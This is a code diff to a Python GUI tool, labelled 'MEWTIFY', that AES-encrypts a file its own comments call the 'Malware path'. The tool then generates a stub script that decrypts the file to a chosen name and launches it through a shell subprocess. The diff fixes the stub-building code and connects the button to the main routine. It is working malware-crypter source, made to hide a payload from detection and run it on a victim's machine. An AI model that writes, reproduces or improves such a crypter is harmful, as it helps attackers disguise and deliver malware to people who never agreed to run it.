@@ -8,9 +8,11 @@ from tkinter.filedialog import askopenfilename
 
 
 def main():
+    global entry3
+    input2 = entry3.get()
     # Open file
-    file_name = path  # Malware path
-    new_file_name = malwarename  # Path to drop file
+    file_name = malwarename  # Malware path
+    new_file_name = input2  # Path to drop file
     file = open(file_name, "rb")
     file_data = file.read()
     file.close()
@@ -22,41 +24,40 @@ def main():
 
     # Create Stub in Python File
     stub = "import pyaes\n"
+    stub += "import sys\n"
     stub += "crypto_data_hex = " + str(crypto_data) + "\n"
     stub += "key = " + str(key) + "\n"
     stub += "new_file_name = \"" + str(new_file_name) + "\"\n"
-    stub += """
-    # Decrypt
-    aes = pyaes.AESModeOfOperationCTR(key)
-    crypto_data = crypto_data_hex
-    decrypt_data = aes.decrypt(crypto_data)
+    stub += "aes = pyaes.AESModeOfOperationCTR(key)\n"
+    stub += "crypto_data = crypto_data_hex\n"
+    stub += "decrypt_data = aes.decrypt(crypto_data)\n"
     # Save file
-    new_file = open(new_file_name, 'wb')
-    new_file.write(decrypt_data)
-    new_file.close()
+    stub += "new_file = open(new_file_name, 'wb')\n"
+    stub += "new_file.write(decrypt_data)\n"
+    stub += "new_file.close()\n"
     # Execute file
-    import subprocess
-    proc = subprocess.Popen("python "+new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    """
+    stub += "import subprocess\n"
+    stub += 'proc = subprocess.Popen("python "+new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n'
 
     # Save the Stub
-    stub_name = "1" + str(malwarename)
+    stub_name = str(input2)
     stub_file = open(stub_name, "w")
     stub_file.write(stub)
     stub_file.close()
 
+    return
 
-filename = ''
+
+
 
 
 def fname():
-    filename = askopenfilename()
-    return filename
+    global malwarename
+    malwarename = askopenfilename()
+    return malwarename
 
 
-def king():
-    print(filename)
-    print ("hello")
+
 
 # GUI Dimensions
 HEIGHT = 500
@@ -82,10 +83,9 @@ label3 = tk.Label(root, text="Name of Mutated Software:", anchor='w', font=15)
 label3.place(relx=0, rely=0.5, relwidth=0.45, relheight=0.15)
 entry3 = tk.Entry(root, font=40)
 entry3.place(relx=.5, rely=0.5, relwidth=0.45, relheight=0.09)
-# GRABBING INPUTS
-input2 = entry3.get()
+entry3.focus_set()
 # button mashing
-button = tk.Button(root, text="MEWTIFY", bg="purple", font=40, command=king)
+button = tk.Button(root, text="MEWTIFY", bg="purple", font=40, command=main)
 button.place(relx=0.3, rely=0.8, relwidth=0.45, relheight=0.15)
 r = IntVar()
 # options button
